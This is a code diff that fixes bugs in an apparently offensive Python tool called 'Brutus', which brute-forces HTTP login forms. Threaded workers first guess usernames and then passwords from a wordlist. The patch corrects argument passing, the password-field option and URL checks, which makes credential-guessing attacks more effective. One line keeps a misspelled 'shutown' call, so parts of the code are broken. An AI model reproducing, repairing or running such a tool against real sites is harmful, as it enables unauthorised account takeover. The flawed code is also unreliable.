@@ -98,13 +98,13 @@ def attack_http(target, wordlist, userfail, passfail, username = None, thread_co
             with ThreadPoolExecutor(max_workers=thread_count) as executor:
                 workers = executor.map(
                     user_worker_http, users, [target] * wordlist_len, [userfail] * wordlist_len,
-                    userfield = [userfield] * wordlist_len, passfield = [passfield] * wordlist_len
+                    [userfail] * wordlist_len, [userfield] * wordlist_len, [passfield] * wordlist_len
                 )
                 try:
                     for cur_user, success, message in workers:
                         if success:
                             found_user = cur_user
-                            executor.shutown(wait=False)
+                            executor.shutown(wait=False, cancel_futures=True)
                             break
 
                 except KeyboardInterrupt:
@@ -129,14 +129,14 @@ def attack_http(target, wordlist, userfail, passfail, username = None, thread_co
         with ThreadPoolExecutor(max_workers=thread_count) as executor:
             workers = executor.map(
                 pass_worker_http, [found_user] * passwds_len, [target] * passwds_len,
-                userfield = [userfield] * passwds_len, passfield = [passfield] * passwds_len
+                [passfail] * passwds_len, [userfield] * passwds_len, [passfield] * passwds_len
             )
 
             try:
                 for cur_pass, success, message in workers:
                     if success:
                         found_pass = cur_pass
-                        executor.shutdown(wait=False)
+                        executor.shutdown(wait=False, cancel_futures=True)
                         break
             except KeyboardInterrupt:
                 message = "User Terminated Via KeyboardInterrupt"
@@ -217,7 +217,7 @@ def make_request_http(target, payload, headers = None):
     try:
         if headers is None:
             headers = { "User-Agent": "Brutus" }
-
+            
         response = requests.post(target, data = payload, headers = headers)
 
         if response.status_code >= 400:
@@ -417,7 +417,7 @@ def main():
     parser.add_argument("--userfail", help = "Phrase given when username incorrect. Default \"Incorrect Username\".", dest = "userfail")
     parser.add_argument("--passfail", help = "Phrase given when password incorrect. Default \"Incorrect Password\".", dest = "passfail")
     parser.add_argument("--userfield", help = "Name of username input in HTTP form. Default \"username\".", dest = "userfield")
-    parser.add_argument("--passfield", help = "Name of password input in HTTP form. Default \"password\".", dest = "userfield")
+    parser.add_argument("--passfield", help = "Name of password input in HTTP form. Default \"password\".", dest = "passfield")
 
     ### Attack-Type Specific Options
     parser.add_argument("-i", "--ip", help = "IP address of target to attack. (Non-HTTP attacks only)", dest = "machine_ip")
@@ -480,16 +480,13 @@ def main():
 
             # Setup Passfield
             password_field_name = str()
-            if args.userfield:
-                password_field_name = args.userfield
-            else:
-                password_field_name = "password"
-
-            # URL Required For HTTP Brute
-            if args.url is None:
-                raise argparse.ArgumentError("Must Specify Target For HTTP Brute Force. (-u or --url)")
+            if args.passfield:
+                password_field_name = args.passfield
             
-            target = args.url
+            if args.url:
+                target = args.url
+            else:
+                raise argparse.ArgumentError(None, "HTTP Attack Required URL Argument.")
             print("[+] Target Set.")
 
             # Make Sure Target Is Online
